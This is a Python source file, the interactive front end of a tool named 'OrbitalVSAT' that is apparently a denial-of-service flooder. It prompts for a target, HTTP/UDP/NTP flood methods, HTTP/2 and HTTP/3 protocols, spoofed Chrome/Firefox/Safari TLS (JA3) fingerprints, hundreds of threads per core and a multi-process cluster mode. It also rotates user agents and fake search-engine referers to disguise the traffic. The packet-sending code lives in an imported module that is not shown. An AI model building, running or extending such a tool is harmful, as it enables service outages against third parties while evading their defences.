#!/usr/bin/env python

import multiprocessing as MP
import os
import socket
import sys
from urllib.parse import urlparse
from lib.core.StdIO import Clear, Logging
from lib.core.ANSIColor import Color
from lib.config.Logo import Banner, Helper
from lib.core.Executor import Executor

try:
    import h2.config
    import h2.connection
    HasH2 = True
except ImportError:
    HasH2 = False

try:
    import asyncio
    from aioquic.asyncio.client import connect
    from aioquic.h3.connection import H3_ALPN
    from aioquic.quic.configuration import QuicConfiguration
    HasH3 = True
except ImportError:
    HasH3 = False


class OrbitalVSAT:
    def __init__(self):
        self.Target = None
        self.Method = "POST"
        self.Threads = 500
        self.Duration = 60
        self.Protocol = "H1"
        self.ClusterMode = False
        self.Processes = MP.cpu_count()
        self.JAProfile = "Chrome"
        self.Running = MP.Value("i", 0)
        self.RequestsCount = MP.Value("i", 0)
        self.BytesSent = MP.Value("i", 0)
        self.StatsLock = MP.Lock()
        self.DefaultUA = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
        ]
        self.DefaultReferers = [
            "https://www.google.com",
            "https://www.bing.com",
            "https://duckduckgo.com",
            "https://search.yahoo.com",
            "https://www.baidu.com",
            "https://yandex.com",
            "https://www.reddit.com",
            "https://twitter.com",
            "https://github.com",
        ]

    def ImportFiles(self, Filename, Default):
        if os.path.exists(Filename):
            try:
                with open(Filename, "r") as FileHandle:
                    return [
                        Line.strip()
                        for Line in FileHandle
                        if Line.strip() and not Line.startswith("#")
                    ] or Default
            except Exception:
                pass
        return Default

    def Setup(self):
        if not self.Target.startswith(("http://", "https://")):
            self.Target = "https://" + self.Target
        Parsed = urlparse(self.Target)
        self.Scheme = Parsed.scheme
        self.Host = Parsed.hostname
        self.Path = Parsed.path or "/"
        self.Port = Parsed.port or (443 if self.Scheme == "https" else 80)
        if "UDP" in self.Method.upper():
            self.Port = 53
        if "NTP" in self.Method.upper():
            self.Port = 123
        try:
            self.IP = socket.gethostbyname(self.Host)
        except Exception:
            Logging.Typewriter(
                f"{Color.Orange}[{Color.Red} ERROR {Color.Orange}]: {Color.White} CANNOT RESOLVE: {Color.Red} {self.Host} {Color.Reset}"
            )
            raise
        self.UserAgents = self.ImportFiles("UA.txt", self.DefaultUA)
        self.Referers = self.ImportFiles("Referers.txt", self.DefaultReferers)
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} TARGET: {Color.White} {self.Target} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} IP ADDRESS: {Color.White} {self.IP}:{self.Port} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} METHODS: {Color.White} {self.Method} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} PROTOCOL: {Color.White} {self.Protocol.upper()} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} JA3 FINGERPRINT: {Color.White} {self.JAProfile} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} USER AGENTS: {Color.White} {len(self.UserAgents)} {Color.Reset}"
        )
        Logging.Typewriter(
            f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} REFERERS: {Color.White} {len(self.Referers)} {Color.Reset}"
        )
        if self.ClusterMode:
            Logging.Typewriter(
                f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} CLUSTER: {Color.White} {self.Processes} {Color.Cyan} CORES X {Color.White} {self.Processes * self.Threads} {Color.DarkGreen} THREADS {Color.Reset}"
            )

    def Start(self):
        try:
            self.Setup()
        except Exception:
            return
        
        Config = {
            "IP": self.IP,
            "Port": self.Port,
            "Host": self.Host,
            "Path": self.Path,
            "Scheme": self.Scheme,
            "Protocol": self.Protocol,
            "JAProfile": self.JAProfile,
            "UserAgents": self.UserAgents,
            "Referers": self.Referers,
            "Method": self.Method,
            "Running": self.Running,
            "RequestsCount": self.RequestsCount,
            "BytesSent": self.BytesSent,
            "StatsLock": self.StatsLock,
            "Threads": self.Threads,
            "Duration": self.Duration,
            "ClusterMode": self.ClusterMode,
            "Processes": self.Processes,
        }
        
        ExecutorInstance = Executor(Config)
        ExecutorInstance.Execute()


def Main():
    Clear()
    Banner()
    try:
        Choice = (
            input(
                f"{Color.White}[{Color.Orange} INFO {Color.White}] {Color.White}Continue? {Color.DarkGreen}Y{Color.White}/{Color.Red}N{Color.White}/{Color.Cyan}H {Color.Orange}"
            )
            .strip()
            .lower()
        )
        if Choice == "h":
            Helper()
            input(
                f"{Color.White}[{Color.Cyan} INFO {Color.White}] {Color.Cyan} PRESS ENTER TO CONTINUE {Color.Reset}"
            )
        elif Choice == "n":
            sys.exit(0)
        
        Logging.Typewriter(f"{Color.Red} ORBITAL CONFIGURATION{Color.Reset}")
        VSAT = OrbitalVSAT()
        VSAT.Target = input(
            f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} TARGET {Color.White} > {Color.Cyan}"
        ).strip()
        if not VSAT.Target:
            return
        
        VSAT.Method = (
            input(
                f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} METHODS {Color.White} > {Color.Cyan}"
            )
            .strip()
            .upper()
        )
        if not VSAT.Method:
            VSAT.Method = "POST"
        
        if VSAT.Method in [
            "GET", "POST", "PUT", "HEAD", "DELETE", "PATCH",
            "OPTIONS", "CONNECT", "TRACE", "RANDOM",
            "H2GET", "H2POST",
        ]:
            Protocol = (
                input(
                    f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} PROTOCOL {Color.White} [ H1 | H2 | H3 | Default H1 ] > {Color.Cyan}"
                )
                .strip()
                .upper()
            )
            VSAT.Protocol = Protocol if Protocol in ["H1", "H2", "H3"] else "H1"
            JA3 = (
                input(
                    f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} JA3 PROFILE {Color.White} [ Chrome | Firefox | Safari | Default Chrome ] > {Color.Cyan}"
                )
                .strip()
                .capitalize()
            )
            VSAT.JAProfile = JA3 if JA3 in ["Chrome", "Firefox", "Safari"] else "Chrome"
        
        ThreadsInput = input(
            f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} THREADS {Color.White} [ Default 500 ] > {Color.Cyan}"
        ).strip()
        VSAT.Threads = int(ThreadsInput) if ThreadsInput else 500
        
        DurationInput = input(
            f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} DURATION {Color.White} [ Seconds, Default 60 ] > {Color.Cyan}"
        ).strip()
        VSAT.Duration = int(DurationInput) if DurationInput else 60
        
        ClusterInput = (
            input(
                f"{Color.White}[{Color.Orange} SET {Color.White}] {Color.DarkGreen} CLUSTER MODE {Color.White} [ Y/N | Default N ] > {Color.Cyan}"
            )
            .strip()
            .lower()
        )
        VSAT.ClusterMode = ClusterInput == "y"
        
        VSAT.Start()
    
    except KeyboardInterrupt:
        Logging.Typewriter(
            f"{Color.Red}[{Color.Orange} INFO {Color.Red}] {Color.Orange} KEYBOARD INTERRUPTED{Color.Reset}"
        )
        sys.exit(0)
    except Exception as Error:
        Logging.Typewriter(
            f"{Color.Orange}[{Color.Red} ERROR {Color.Orange}]: {Color.Red} {Error} {Color.Reset}"
        )


if __name__ == "__main__":
    Main()